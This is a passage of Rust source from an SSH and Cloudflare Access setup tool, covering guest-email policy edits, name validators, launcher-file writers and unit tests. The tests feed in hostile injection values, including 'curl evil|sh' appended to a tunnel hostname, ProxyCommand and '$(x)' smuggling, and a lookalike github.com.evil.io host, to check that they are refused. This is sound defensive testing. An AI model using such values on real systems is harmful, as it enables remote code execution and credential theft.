/// rule stays as it was and where it was; adding one already there or removing one absent changes nothing.
pub fn with_guest(include: &[Value], email: &str, add: bool) -> Vec<Value> {
    let is = |r: &Value| r["email"]["email"].as_str().is_some_and(|e| e.eq_ignore_ascii_case(email));
    let mut out: Vec<Value> = include.iter().filter(|r| add || !is(r)).cloned().collect();
    if add && !include.iter().any(is) { out.push(serde_json::json!({ "email": { "email": email } })); }
    out
}

/// The body that writes `policy` back with `include` in place of its own: every field Cloudflare reads kept as it
/// was, the ones it sets itself (ids, times, reusable) left out.
pub fn policy_update(policy: &Value, include: Vec<Value>) -> Value {
    let mut body = policy.clone();
    if let Some(o) = body.as_object_mut() {
        for k in ["id", "uid", "created_at", "updated_at", "reusable"] { o.remove(k); }
        o.insert("include".into(), Value::Array(include));
    }
    body
}

// ---------------------------------------------------------------- guests
// A guest reaches no vault that lists machines, so the app cannot tell them which machines exist: they type the
// name an owner gave them and the app keeps it on this computer.

/// A machine's name as a guest types it: lower-case letters, digits and hyphens, 1 to 32 of them.
pub fn machine_name(name: &str) -> Result<String, String> {
    let n = name.trim();
    let ok = (1..=32).contains(&n.len()) && n.bytes().all(|c| c.is_ascii_lowercase() || c.is_ascii_digit() || c == b'-');
    if ok { Ok(n.to_string()) } else { Err("A machine's name is lower-case letters, digits and hyphens, 1 to 32 of them.".into()) }
}

/// The SSH hostname a machine's tunnel has: ssh-<name> in the team's zone (`zone` starts with a dot).
pub fn machine_tunnel(name: &str, zone: &str) -> Result<String, String> {
    Ok(format!("ssh-{}{zone}", machine_name(name)?))
}

/// The page where the signed-in account accepts its pending invitation to `repo` ("owner/name"), from GitHub's
/// user/repository_invitations; None when there is none (or it has expired).
pub fn pending_invitation(invitations: &[Value], repo: &str) -> Option<String> {
    invitations.iter().find(|i| i["repository"]["full_name"].as_str().is_some_and(|r| r.eq_ignore_ascii_case(repo)) && i["expired"] != true)
        .map(|i| i["html_url"].as_str().map(String::from).unwrap_or_else(|| format!("https://github.com/{repo}/invitations")))
}

/// A guest: signed in, but no vault this account can read lists a machine (`machines` is each vault's count; 0 for a
/// vault it cannot read). Such a person reaches only the machines an owner let them in to by email.
pub fn is_guest(signed_in: bool, machines: &[usize]) -> bool {
    signed_in && machines.iter().all(|&n| n == 0)
}

// ---------------------------------------------------------------- SSH without ~/.ssh/config
// `aiwalk-setup ssh` and the Machines page's SSH button reach a machine with the app's own proxy and certificate, so
// nobody depends on the block "Set up connections" writes.

/// A login name on a machine: letters, digits, `_`, `.` and `-`, not starting with `-`, at most 32.
fn account_ok(a: &str) -> bool {
    (1..=32).contains(&a.len()) && !a.starts_with('-') && a.bytes().all(|c| c.is_ascii_alphanumeric() || b"_.-".contains(&c))
}

/// `[account@]<name or ssh-<name><zone>>` as (account, SSH hostname): a name becomes ssh-<name><zone>, a full
/// ssh-…<zone> hostname is taken as it is, anything else is refused with a sentence.
pub fn ssh_destination(dest: &str, zone: &str) -> Result<(Option<String>, String), String> {
    let (user, host) = match dest.rsplit_once('@') { Some((u, h)) => (Some(u), h), None => (None, dest) };
    if let Some(u) = user.filter(|u| !account_ok(u)) { return Err(format!("{u} is not an account name")) }
    let host = host.trim().to_ascii_lowercase();
    let name = host.strip_prefix("ssh-").and_then(|r| r.strip_suffix(zone)).unwrap_or(&host);
    let tunnel = machine_tunnel(name, zone)
        .map_err(|_| format!("{host} is not one of the team's machines: give its name, like dragon, or its ssh-<name>{zone} hostname"))?;
    Ok((user.map(String::from), tunnel))
}

/// The account for `tunnel` when none was given: the one the vault's rules name for that machine, else "ntk".
pub fn default_account(rules_json: Option<&str>, tunnel: &str) -> String {
    let name = tunnel.strip_prefix("ssh-").and_then(|t| t.split('.').next()).unwrap_or(tunnel);
    machines(rules_json.unwrap_or_default()).into_iter()
        .find(|m| (m.host == name || m.tunnel.as_deref() == Some(tunnel)) && account_ok(&m.user))
        .map_or_else(|| "ntk".into(), |m| m.user)
}

/// `aiwalk-setup ssh`'s arguments as ssh reads them: (options before the destination, the destination, the remote
/// command). An option letter that takes a value takes the rest of its word, or else the next argument (`-L 8080:x:80`,
/// `-NL8080:x:80`, `-o Foo=bar`).
pub fn ssh_args(args: &[String]) -> Result<(Vec<String>, String, Vec<String>), String> {
    const WITH_VALUE: &str = "BbcDEeFIiJLlmOoPpQRSWw";   // ssh(1)'s synopsis
    let mut opts = vec![];
    let mut i = 0;
    while let Some(a) = args.get(i) {
        if a == "--" { i += 1; break }
        if !a.starts_with('-') || a.len() == 1 { break }
        opts.push(a.clone());
        let letters: Vec<char> = a[1..].chars().collect();
        if letters.iter().position(|c| WITH_VALUE.contains(*c)).is_some_and(|p| p + 1 == letters.len()) {
            i += 1;
            opts.push(args.get(i).ok_or_else(|| format!("{a} needs a value"))?.clone());
        }
        i += 1;
    }
    let dest = args.get(i).ok_or("no machine given: aiwalk-setup ssh [ssh options] <account>@<machine> [command]")?.clone();
    Ok((opts, dest, args[i + 1..].to_vec()))
}

/// What the SSH button runs in a terminal: this app's own `ssh` subcommand, so the certificate is fetched in there
/// and the same line works again later.
pub fn ssh_argv(app: &str, user: &str, tunnel: &str) -> Vec<String> {
    // --session: the button opens the person's lasting session on the machine, not a shell that dies with the window
    vec![app.into(), "ssh".into(), "--session".into(), format!("{user}@{tunnel}")]
}

/// A session's name on a machine (hosts/exo-term): 1 to 32 of letters, digits, dot, dash, underscore, not starting
/// with a dot. Anything else is refused, since the name becomes part of a command line on the machine.
pub fn session_name(name: &str) -> Result<String, String> {
    let ok = (1..=32).contains(&name.len()) && !name.starts_with('.') && name.bytes().all(|c| c.is_ascii_alphanumeric() || b"_.-".contains(&c));
    if ok { Ok(name.to_string()) } else { Err("A session's name is 1 to 32 letters, digits, dot, dash or underscore.".into()) }
}

/// What ssh runs on the machine for `--session NAME`: the session tool when the machine has it, else a plain login
/// shell with a line saying so, so the same command works on a machine not updated yet.
pub fn session_command(name: &str) -> String {
    format!("sh -c 'if [ -x ~/.local/bin/exo-term ]; then exec ~/.local/bin/exo-term attach {name}; fi; \
             echo \"This machine has no session tool yet (an owner updates the host tools): a plain shell, which ends with this window.\"; \
             exec \"${{SHELL:-/bin/sh}}\" -l'")
}

/// Linux terminal programs in the order tried, each with the arguments that go before the command it runs (one
/// argument each, never a shell string). $TERMINAL comes first: a known one with its own form, any other with -e.
pub fn linux_terminals(terminal_env: Option<&str>) -> Vec<(String, Vec<&'static str>)> {
    const KNOWN: [(&str, &[&str]); 7] = [("x-terminal-emulator", &["-e"]), ("gnome-terminal", &["--"]), ("konsole", &["-e"]),
        ("xfce4-terminal", &["-x"]), ("kitty", &[]), ("alacritty", &["-e"]), ("xterm", &["-e"])];
    let mut out: Vec<(String, Vec<&str>)> = vec![];
    if let Some(t) = terminal_env.map(str::trim).filter(|t| !t.is_empty()) {
        let base = t.rsplit('/').next().unwrap_or(t);
        out.push((t.into(), KNOWN.iter().find(|k| k.0 == base).map_or(vec!["-e"], |k| k.1.to_vec())));
    }
    out.extend(KNOWN.iter().map(|(p, pre)| (p.to_string(), pre.to_vec())));
    out
}

/// One word for sh, in single quotes (a single quote inside becomes '\'').
pub fn sh_quote(s: &str) -> String { format!("'{}'", s.replace('\'', r"'\''")) }

/// macOS: the .command file Terminal runs for the SSH button. It deletes itself (and its private folder) first, then
/// becomes the command, so its exit code is ssh's and Terminal keeps the window open on a failure.
pub fn command_file(argv: &[String]) -> String {
    format!("#!/bin/sh\nrm -f \"$0\"; rmdir \"$(dirname \"$0\")\" 2>/dev/null\nexec {}\n", argv.iter().map(|a| sh_quote(a)).collect::<Vec<_>>().join(" "))
}

/// One word on a batch file's line: in double quotes, where & | < > ^ ( ) are plain; `%` is still read by cmd in a
/// batch file, so it is doubled. A double quote or a line break cannot be carried at all.
pub fn cmd_quote(s: &str) -> Result<String, String> {
    if s.contains(['"', '\r', '\n']) { return Err(format!("{s} cannot be written into a Windows command line")) }
    Ok(format!("\"{}\"", s.replace('%', "%%")))
}

/// Windows: the .cmd file the SSH button starts in a console window. UTF-8 (chcp first, so a path with non-ASCII
/// letters reads right), waits when the command fails so its last words can be read, then deletes itself and its
/// folder (`(goto)` ends the batch first, so cmd does not go on reading a deleted file; the window was started in
/// that folder, so it steps out of it before removing it).
pub fn batch_file(argv: &[String]) -> Result<String, String> {
    let line = argv.iter().map(|a| cmd_quote(a)).collect::<Result<Vec<_>, _>>()?.join(" ");
    Ok(format!("@chcp 65001 >nul\r\n@echo off\r\n{line}\r\nif errorlevel 1 pause\r\n(goto) 2>nul & del \"%~f0\" & cd /d \"%~dp0..\" & rmdir \"%~dp0\"\r\n"))
}

#[cfg(test)]
mod tests {
    #[test]
    fn guests_name_machines_and_get_their_tunnel() {
        assert_eq!(super::machine_name(" otter-2 ").unwrap(), "otter-2");
        assert_eq!(super::machine_name(&"a".repeat(32)).unwrap().len(), 32);
        for bad in ["", "Otter", "otter.x", "ot ter", "otter_2", "ssh-otter.aiwalkcorp.com", &"a".repeat(33), "ötter"] {
            assert!(super::machine_name(bad).is_err(), "{bad} should be refused");
        }
        assert_eq!(super::machine_tunnel("otter", ".example.org").unwrap(), "ssh-otter.example.org");
        assert!(super::machine_tunnel("../x", ".example.org").is_err());
    }

    #[test]
    fn a_pending_invitation_names_its_page() {
        let inv: Vec<serde_json::Value> = serde_json::from_str(r#"[{"id": 1, "expired": false, "html_url": "https://github.com/Other/x/invitations", "repository": {"full_name": "Other/x"}},
            {"id": 2, "expired": false, "html_url": "https://github.com/ExampleCorp/access-requests/invitations", "repository": {"full_name": "ExampleCorp/access-requests"}}]"#).unwrap();
        assert_eq!(super::pending_invitation(&inv, "examplecorp/access-requests").as_deref(), Some("https://github.com/ExampleCorp/access-requests/invitations"));
        assert_eq!(super::pending_invitation(&inv, "ExampleCorp/docs"), None);
        let mut gone = inv.clone(); gone[1]["expired"] = true.into();
        assert_eq!(super::pending_invitation(&gone, "ExampleCorp/access-requests"), None);
    }

    #[test]
    fn a_guest_is_signed_in_with_no_machines_from_any_vault() {
        assert!(super::is_guest(true, &[0, 0]));
        assert!(super::is_guest(true, &[]));
        assert!(!super::is_guest(true, &[3, 0]));
        assert!(!super::is_guest(false, &[0, 0]));
    }

    #[test]
    fn ssh_destinations_are_a_name_or_the_full_hostname() {
        let z = ".example.org";
        let ok = |d: &str| super::ssh_destination(d, z).unwrap();
        assert_eq!(ok("ntk@otter"), (Some("ntk".into()), "ssh-otter.example.org".into()));
        assert_eq!(ok("otter"), (None, "ssh-otter.example.org".into()));
        assert_eq!(ok("kuo.x-2@ssh-otter.example.org"), (Some("kuo.x-2".into()), "ssh-otter.example.org".into()));
        assert_eq!(ok("Otter"), (None, "ssh-otter.example.org".into()));
        for bad in ["ntk@otter.example.org", "ntk@ssh-otter.evil.org", "ntk@10.0.0.1", "ntk@", "-oProxyCommand=x@otter", "a b@otter",
                    "ntk@ssh-.example.org", "ntk@ötter", "@otter"] {
            assert!(super::ssh_destination(bad, z).is_err(), "{bad} should be refused");
        }
        assert!(super::ssh_destination("ntk@otter.example.org", z).unwrap_err().contains("not one of the team's machines"));
    }

    #[test]
    fn rules_cannot_put_a_command_in_the_ssh_config() {
        let m = |host: &str, tunnel: &str| Machine { host: host.into(), tunnel: Some(tunnel.into()), cert: true, ..Default::default() };
        let block = ssh_block(&[m("otter", "ssh-otter.example.org"), m("*", "ssh-x.example.org"), m("heron", "ssh-h.example.org;curl evil|sh;#"),
                                m("crane", "ssh-c.example.org\n  ProxyCommand evil"), m("ibis\nHost *", "ssh-i.example.org")], "/app");
        assert_eq!(block.matches("Match originalhost").count(), 1, "{block}");
        assert!(block.contains("Match originalhost otter ") && !block.contains("evil") && !block.contains('*'));
    }

    #[test]
    fn a_translocated_mac_app_names_its_copy_in_applications() {
        let t = "/private/var/folders/ab/T/AppTranslocation/1F2E/d/aIwalk System Setup.app/Contents/MacOS/aiwalk-setup";
        let installed = "/Applications/aIwalk System Setup.app/Contents/MacOS/aiwalk-setup";
        assert_eq!(super::lasting_app_path(t, "/Users/jo", |p| p == installed).as_deref(), Some(installed));
        assert_eq!(super::lasting_app_path(t, "/Users/jo", |p| p.starts_with("/Users/jo/Applications/")).as_deref(),
                   Some("/Users/jo/Applications/aIwalk System Setup.app/Contents/MacOS/aiwalk-setup"));
        assert_eq!(super::lasting_app_path(t, "/Users/jo", |_| false), None);
        assert_eq!(super::lasting_app_path("/Volumes/aIwalk System Setup/aIwalk System Setup.app/Contents/MacOS/aiwalk-setup", "/Users/jo", |_| false), None);
        assert_eq!(super::lasting_app_path(installed, "/Users/jo", |_| false).as_deref(), Some(installed));
        assert_eq!(super::lasting_app_path("/usr/bin/aiwalk-setup", "/home/jo", |_| false).as_deref(), Some("/usr/bin/aiwalk-setup"));
    }

    #[test]
    fn the_default_account_is_the_vaults_or_ntk() {
        let rules = r#"{"machines": {"hosts": [{"host": "otter", "repos": {"Otter": "otter-repo"}, "account": "kuo-x", "tunnel": "ssh-otter.example.org"},
                                               {"host": "heron", "repos": {"Heron": ""}}]}}"#;
        assert_eq!(super::default_account(Some(rules), "ssh-otter.example.org"), "kuo-x");
        assert_eq!(super::default_account(Some(rules), "ssh-heron.example.org"), "ntk");
        assert_eq!(super::default_account(Some(rules), "ssh-crane.example.org"), "ntk");
        assert_eq!(super::default_account(None, "ssh-otter.example.org"), "ntk");
    }

    #[test]
    fn ssh_options_stay_before_the_destination_and_the_command_after() {
        let v = |s: &[&str]| s.iter().map(|x| x.to_string()).collect::<Vec<_>>();
        assert_eq!(super::ssh_args(&v(&["-N", "-L", "8080:localhost:80", "ntk@otter"])).unwrap(), (v(&["-N", "-L", "8080:localhost:80"]), "ntk@otter".into(), v(&[])));
        assert_eq!(super::ssh_args(&v(&["-NL8080:x:80", "-o", "BatchMode=yes", "-t", "otter", "ls", "-la"])).unwrap(),
                   (v(&["-NL8080:x:80", "-o", "BatchMode=yes", "-t"]), "otter".into(), v(&["ls", "-la"])));
        assert_eq!(super::ssh_args(&v(&["-vNL", "1:x:2", "otter", "exit 7"])).unwrap(), (v(&["-vNL", "1:x:2"]), "otter".into(), v(&["exit 7"])));
        assert_eq!(super::ssh_args(&v(&["--", "otter", "-x"])).unwrap(), (v(&[]), "otter".into(), v(&["-x"])));
        assert!(super::ssh_args(&v(&["-L"])).is_err());
        assert!(super::ssh_args(&v(&["-N"])).is_err());
    }

    #[test]
    fn terminals_are_tried_terminal_env_first_each_with_its_own_form() {
        let t = super::linux_terminals(None);
        assert_eq!(t.iter().map(|(p, _)| p.as_str()).collect::<Vec<_>>(),
                   ["x-terminal-emulator", "gnome-terminal", "konsole", "xfce4-terminal", "kitty", "alacritty", "xterm"]);
        assert_eq!(t[1].1, ["--"]); assert_eq!(t[3].1, ["-x"]); assert!(t[4].1.is_empty());
        assert_eq!(super::linux_terminals(Some("/home/x/my term"))[0], ("/home/x/my term".to_string(), vec!["-e"]));
        assert_eq!(super::linux_terminals(Some("/usr/bin/gnome-terminal"))[0].1, ["--"]);
        assert_eq!(super::linux_terminals(Some("  ")).len(), 7);
    }

    #[test]
    fn the_macos_command_file_quotes_every_word_for_sh() {
        let argv = super::ssh_argv("/Applications/aIwalk System Setup.app/Contents/MacOS/it's 100% «好»", "ntk", "ssh-otter.example.org");
        let f = super::command_file(&argv);
        assert_eq!(f, "#!/bin/sh\nrm -f \"$0\"; rmdir \"$(dirname \"$0\")\" 2>/dev/null\n\
                       exec '/Applications/aIwalk System Setup.app/Contents/MacOS/it'\\''s 100% «好»' 'ssh' '--session' 'ntk@ssh-otter.example.org'\n");
        // sh itself reads the words back exactly
        if std::path::Path::new("/bin/sh").exists() {
            let words = argv.iter().map(|a| super::sh_quote(a)).collect::<Vec<_>>().join(" ");
            let out = std::process::Command::new("/bin/sh").args(["-c", &format!("printf '%s\\n' {words}")]).output().unwrap();
            assert_eq!(String::from_utf8(out.stdout).unwrap(), argv.join("\n") + "\n");
        }
    }

    #[test]
    fn the_windows_batch_file_doubles_percent_and_refuses_quotes() {
        let argv = super::ssh_argv(r"C:\Users\Jo Ann\AppData\Local\aIwalk (x86) & 100%\好\aiwalk-setup.exe", "ntk", "ssh-otter.example.org");
        assert_eq!(super::batch_file(&argv).unwrap(),
            "@chcp 65001 >nul\r\n@echo off\r\n\"C:\\Users\\Jo Ann\\AppData\\Local\\aIwalk (x86) & 100%%\\好\\aiwalk-setup.exe\" \"ssh\" \"--session\" \"ntk@ssh-otter.example.org\"\r\n\
             if errorlevel 1 pause\r\n(goto) 2>nul & del \"%~f0\" & cd /d \"%~dp0..\" & rmdir \"%~dp0\"\r\n");
        assert!(super::batch_file(&super::ssh_argv(r#"C:\a"b.exe"#, "ntk", "x")).is_err());
    }

    #[test]
    fn a_session_name_cannot_carry_a_command() {
        assert_eq!(super::session_name("eddLai-2").unwrap(), "eddLai-2");
        for bad in ["", ".x", "a b", "a;b", "a'b", "$(x)", "../x", &"x".repeat(33)] { assert!(super::session_name(bad).is_err(), "{bad}") }
        let c = super::session_command("eddLai");
        assert!(c.contains("exo-term attach eddLai;") && c.starts_with("sh -c '") && c.ends_with("-l'"));
        assert_eq!(super::ssh_argv("/app", "ntk", "ssh-otter.example.org"), ["/app", "ssh", "--session", "ntk@ssh-otter.example.org"]);
        assert!(super::cmd_quote("a\nb").is_err());
        assert_eq!(super::cmd_quote("%PATH%").unwrap(), "\"%%PATH%%\"");
    }

    #[test]
    fn a_guest_machine_with_only_host_tunnel_and_cert_gets_its_ssh_alias() {
        let m: super::Machine = serde_json::from_str(r#"{"host": "otter", "tunnel": "ssh-otter.example.org", "cert": true}"#).unwrap();
        assert_eq!((m.account.as_str(), m.repo.as_str(), m.via.as_deref(), m.teams.len()), ("", "", None, 0));
        let block = super::ssh_block(&[m], "/opt/aiwalk-setup");
        assert!(block.contains(r#"Match originalhost otter exec "'/opt/aiwalk-setup' --ssh-cert ssh-otter.example.org --quiet""#)
            && block.contains("HostName ssh-otter.example.org") && block.contains("IdentityFile ~/.cloudflared/ssh-otter.example.org-cf_key"), "{block}");
    }

    // shaped like a real app-scoped allow policy (GET access/apps), ids and names invented
    fn guest_policy() -> serde_json::Value {
        let gh = |team: &str| serde_json::json!({ "github-organization": { "id": "1001", "identity_provider_id": "idp-0000", "name": "ExampleCorp", "team": team } });
        serde_json::json!({ "created_at": "2026-01-01T00:00:00Z", "decision": "allow", "exclude": [], "id": "pol-1", "uid": "pol-1",
            "include": [gh("core"), { "email": { "email": "Ivy@Example.com" } }, gh("machine-dragon"), { "email_domain": { "domain": "example.org" } }],
            "name": "dragon: code repo teams and machine-dragon", "precedence": 1, "require": [], "reusable": false, "updated_at": "2026-01-01T00:00:00Z" })
    }

    #[test]
    fn guest_emails_come_from_email_rules_only() {
        let app = serde_json::json!({ "name": "dragon", "policies": [{ "decision": "deny", "include": [{ "email": { "email": "no@x.io" } }] }, guest_policy()] });
        assert_eq!(super::policy_emails(super::allow_policy(&app).unwrap()), ["ivy@example.com"]);
        assert!(super::allow_policy(&serde_json::json!({ "name": "x" })).is_none());
        assert!(super::policy_emails(&serde_json::json!({})).is_empty());
    }

    #[test]
    fn adding_and_removing_a_guest_keeps_every_other_rule_in_place() {
        let p = guest_policy();
        let inc = p["include"].as_array().unwrap();
        let text = |v: &[serde_json::Value]| v.iter().map(|r| r.to_string()).collect::<Vec<_>>();
        let added = super::with_guest(inc, "jo@example.com", true);
        assert_eq!(text(&added[..4]), text(inc));
        assert_eq!(added[4], serde_json::json!({ "email": { "email": "jo@example.com" } }));
        // already there (in another case): nothing changes
        assert_eq!(text(&super::with_guest(inc, "ivy@example.com", true)), text(inc));
        let removed = super::with_guest(inc, "ivy@example.com", false);
        assert_eq!(text(&removed), text(&[inc[0].clone(), inc[2].clone(), inc[3].clone()]));
        // absent: nothing changes
        assert_eq!(text(&super::with_guest(inc, "nobody@example.com", false)), text(inc));
        // the body keeps every field Cloudflare reads and drops the ones it sets
        let body = super::policy_update(&p, removed.clone());
        assert_eq!(body, serde_json::json!({ "decision": "allow", "exclude": [], "include": removed,
            "name": "dragon: code repo teams and machine-dragon", "precedence": 1, "require": [] }));
    }

    #[test]
    fn guest_emails_are_checked_and_lower_cased() {
        assert_eq!(super::guest_email("  Ivy@Example.COM ").unwrap(), "ivy@example.com");
        for bad in ["", "ivy", "@example.com", "ivy@", "a@b@c", "ivy tam@example.com"] { assert!(super::guest_email(bad).is_err(), "{bad}") }
        let long = format!("{}@example.com", "a".repeat(243));
        assert!(super::guest_email(&long).is_err());
        assert!(super::guest_email(&long[1..]).is_ok());
    }
    #[test]
    fn git_is_given_the_password_for_github_only() {
        let ask = |host: &str, proto: &str| format!("protocol={proto}\nhost={host}\r\npath=o/r.git\n\n");
        assert_eq!(credential_reply(&ask("github.com", "https"), "amy", "gho_x").as_deref(), Some("username=amy\npassword=gho_x\n"));
        assert_eq!(credential_reply(&ask("gitlab.com", "https"), "amy", "gho_x"), None);
        assert_eq!(credential_reply(&ask("github.com.evil.io", "https"), "amy", "gho_x"), None);
        assert_eq!(credential_reply(&ask("github.com", "http"), "amy", "gho_x"), None);
        assert_eq!(credential_reply("", "amy", "gho_x"), None);
    }

    #[test]
    fn another_programs_appimage_is_not_ours() {
        let ours = Some("/home/a/aIwalk.AppImage");
        assert_eq!(own_appimage(ours, Some("/tmp/.mount_aIwalkX"), "/tmp/.mount_aIwalkX/usr/bin/aiwalk-setup").as_deref(), ours);
        assert_eq!(own_appimage(ours, Some("/tmp/.mount_aIwalkX/"), "/tmp/.mount_aIwalkX/usr/bin/aiwalk-setup").as_deref(), ours);
        // started from Obsidian's AppImage: its variables are in the environment, this program is elsewhere
        let obsidian = (Some("/home/a/Obsidian-1.6.7.AppImage"), Some("/tmp/.mount_ObsidiY"));
        assert_eq!(own_appimage(obsidian.0, obsidian.1, "/home/a/.local/share/aiwalk-setup/aiwalk-setup"), None);
        assert_eq!(own_appimage(obsidian.0, obsidian.1, "/tmp/.mount_ObsidiY2/usr/bin/aiwalk-setup"), None);
        assert_eq!(own_appimage(obsidian.0, None, "/usr/bin/aiwalk-setup"), None);
        assert_eq!(own_appimage(None, Some("/tmp/x"), "/tmp/x/aiwalk-setup"), None);
        assert_eq!(own_appimage(Some(""), Some(""), "/aiwalk-setup"), None);
    }

    #[test]
    fn resize_requests_leave_the_stream_and_nothing_else_does() {
        let mut sc = ResizeScanner::default();
        assert_eq!(sc.feed(b"ls\r\x1b]777;resize;120;40\x07cd"), (b"ls\rcd".to_vec(), vec![(120, 40)]));
        // split across reads anywhere after its first two bytes
        let mut all = sc.feed(b"a\x1b]");
        for b in b"777;resize;80;24\x07b" { let (o, z) = sc.feed(&[*b]); all.0.extend(o); all.1.extend(z); }
        assert_eq!(all, (b"ab".to_vec(), vec![(80, 24)]));
        // the Esc key alone goes through at once, also right after other input
        assert_eq!(sc.feed(b"\x1b"), (b"\x1b".to_vec(), vec![]));
        assert_eq!(sc.feed(b"hi\x1b"), (b"hi\x1b".to_vec(), vec![]));
        assert_eq!(sc.feed(b"x"), (b"x".to_vec(), vec![]));
        // other escape sequences, a look-alike and a malformed request pass through whole
        for other in [&b"\x1b[A"[..], b"\x1b]0;title\x07", b"\x1b]777;notify;hi\x07", b"\x1b]777;resize;x\x07", b"\x1b]777;resize;12;\x07", b"\x1b\x1b[B"] {
            assert_eq!(sc.feed(other), (other.to_vec(), vec![]), "{other:?}");
        }
        // an unfinished request stays held until the stream says more
        assert_eq!(sc.feed(b"x\x1b]777;res"), (b"x".to_vec(), vec![]));
        assert_eq!(sc.feed(b"et"), (b"\x1b]777;reset".to_vec(), vec![]));
    }

    #[test]
    fn only_python_3_counts() {
        assert_eq!(python_version("Python 3.12.4\r\n").as_deref(), Some("3.12.4"));
        assert_eq!(python_version("Python 3.13.0rc1").as_deref(), Some("3.13.0rc1"));
        assert_eq!(python_version("Python 2.7.18"), None);
        assert_eq!(python_version("Python was not found; run without arguments to install from the Microsoft Store"), None);
        assert_eq!(python_version(""), None);
    }

    #[test]
    fn owners_who_left_since_a_secret_was_shared() {
        let now = vec!["eddLai".to_string(), "gnaixihZ".to_string()];
        assert_eq!(owners_gone("eddLai\ngnaixihz\nchengloutai\n\n", &now), ["chengloutai"]);
        assert!(owners_gone("eddlai\n", &now).is_empty() && owners_gone("", &now).is_empty());
    }

    #[test]
    fn later_versions() {
        assert!(newer("v0.3.0", "0.2.0") && newer("v0.10.0", "0.9.0") && newer("1.0.0", "0.9.9"));
        assert!(!newer("v0.2.0", "0.2.0") && !newer("v0.1.0", "0.2.0") && !newer("nightly", "0.2.0") && !newer("", "0.2.0"));
    }


    #[test]
    fn interns_one_row_per_person() {
        let j = |s: &str| serde_json::from_str::<Vec<Value>>(s).unwrap();
        let collab = [("exo-book".to_string(), j(r#"[{"login":"amy","role_name":"write"}]"#))];
        let inv = [("exo-papers".to_string(), j(r#"[{"id":7,"permissions":"read","invitee":{"login":"amy"}},{"id":8,"permissions":"write","invitee":{"login":"bob"}}]"#))];
        let got = interns(&j(r#"[{"login":"amy"}]"#), &collab, &inv, &BTreeSet::from(["bob".to_string()]));
        assert_eq!(got, [Intern { login: "amy".into(), repos: vec![
            InternRepo { repo: "exo-book".into(), level: "write".into(), invite: None },
            InternRepo { repo: "exo-papers".into(), level: "read".into(), invite: Some(7) }] }]);
    }

    #[test]
    fn host_tool_versions() {
        assert_eq!(host_tool_version("#!/bin/bash\nset -e\nVERSION=3   # raise by hand\n"), Some(3));
        assert_eq!(host_tool_version("x = 1\nVERSION = \"12\"\n"), Some(12));
        assert_eq!(host_tool_version("#!/usr/bin/env python3\nprint(1)\n"), None);
        let shipped = [("exo-status.py", 2), ("exo", 1), ("exo-desktop", 1)];
        let f = |s: &str| serde_json::from_str::<Value>(s).unwrap();
        assert_eq!(host_tools_line(&f(r#"{"exo-status.py":2,"exo":1,"exo-desktop":1}"#), &shipped), "Host tools: current");
        assert_eq!(host_tools_line(&f(r#"{"exo-status.py":1,"exo":null,"exo-desktop":2}"#), &shipped),
                   "Host tools: exo-status.py older, exo missing, exo-desktop newer than this app");
        assert!(host_tools_line(&Value::Null, &shipped).contains("older"));
    }

    #[test]
    fn terms_versions_and_acceptances() {
        assert_eq!(terms_version("<!-- terms version: 3 -->\n# Terms"), Some(3));
        assert_eq!(terms_version("# Terms\nno version"), None);
        let rows = r#"[{"title":"Terms v1 accepted","created_at":"2026-10-03T01:02:03Z"},
                       {"title":"Terms v2 accepted","created_at":"2026-11-01T00:00:00Z"},
                       {"title":"write access to NTKCAP","created_at":"2026-12-01T00:00:00Z"}]"#;
        assert_eq!(terms_accepted(rows), Some((2, "2026-11-01".into())));
        assert_eq!(terms_accepted("[]"), None);
        assert_eq!(terms_title(2), "Terms v2 accepted");
    }

    use super::*;

    const RULES: &str = r#"{"repos": {"org": "ExoPulseHQ", "book": "exo-book", "routes": [
        {"prefix": "main.md", "repo": "exo-book"},
        {"prefix": ".claude/", "repo": "exo-tooling"},
        {"prefix": "L3_Simulation_AI/", "repo": "exo-l3"},
        {"prefix": "Papers/", "repo": "exo-papers"},
        {"prefix": "Project_Management/Strategy_IP_Market/", "repo": "exo-mgmt"},
        {"prefix": "Papers/", "repo": "exo-papers"}]}}"#;

    const ORG: &str = r#"{"data": {"organization": {
        "membersWithRole": {"edges": [
            {"role": "ADMIN", "node": {"login": "owner", "name": "Owner"}},
            {"role": "MEMBER", "node": {"login": "alice", "name": null}}]},
        "teams": {"nodes": [
            {"slug": "members", "members": {"nodes": [{"login": "alice"}, {"login": "owner"}]},
             "repositories": {"edges": [{"permission": "READ", "node": {"name": "exo-papers"}}]}},
            {"slug": "l3-write", "members": {"nodes": [{"login": "alice"}]},
             "repositories": {"edges": [{"permission": "WRITE", "node": {"name": "exo-l3"}},
                                        {"permission": "WRITE", "node": {"name": "exo-papers"}}]}},
            {"slug": "core", "members": {"nodes": []},
             "repositories": {"edges": [{"permission": "ADMIN", "node": {"name": "exo-mgmt"}}]}}]}}}}"#;

    #[test]
    fn routes_become_repos_without_book_or_hidden_folders() {
        let v = vault_repos(RULES).unwrap();
        assert_eq!(v.org, "ExoPulseHQ");
        let names: Vec<_> = v.repos.iter().map(|(r, f)| (r.as_str(), f.join(","))).collect();
        assert_eq!(names, [("exo-tooling", "".into()), ("exo-l3", "L3_Simulation_AI/".into()),
                           ("exo-papers", "Papers/".into()), ("exo-mgmt", "Project_Management/Strategy_IP_Market/".into())]);
        assert_eq!(vault_repos(r#"{"repos": {"org": "", "book": "b", "routes": []}}"#), None);
        assert_eq!(vault_repos("not json"), None);
    }

    const REPOS_OWNER: &str = r#"{"data": {"organization": {"repositories": {"nodes": [
        {"name": "exo-l3", "collaborators": {"edges": [{"permission": "WRITE", "node": {"login": "alice"}},
                                                       {"permission": "ADMIN", "node": {"login": "owner"}}]}},
        {"name": "NTKCAP", "collaborators": {"edges": [{"permission": "READ", "node": {"login": "alice"}},
                                                       {"permission": "READ", "node": {"login": "ivy", "name": "Ivy Intern"}}]}}]}}}}"#;

    #[test]
    fn grants_come_from_repo_permissions() {
        let a = org_access(ORG);
        assert_eq!(a.people["owner"].grants, None);
        let l3 = a.teams.iter().find(|t| t.slug == "l3-write").unwrap();
        assert_eq!(l3.members.iter().collect::<Vec<_>>(), ["alice"]);
        assert_eq!(org_access("garbage"), OrgAccess::default());

        let mut people = org_access(ORG).people;
        repo_grants(&mut people, REPOS_OWNER, "owner");
        let alice = people["alice"].grants.as_ref().unwrap();
        assert_eq!((alice["exo-l3"], alice["NTKCAP"]), (2, 1));
        assert_eq!(people["owner"].grants, None);
        // on a repo without being a member: listed as outside, with what that repo gives
        assert!(people["ivy"].outside && !people["alice"].outside);
        assert_eq!((people["ivy"].name.as_str(), people["ivy"].grants.as_ref().unwrap().get("NTKCAP")), ("Ivy Intern", Some(&1)));

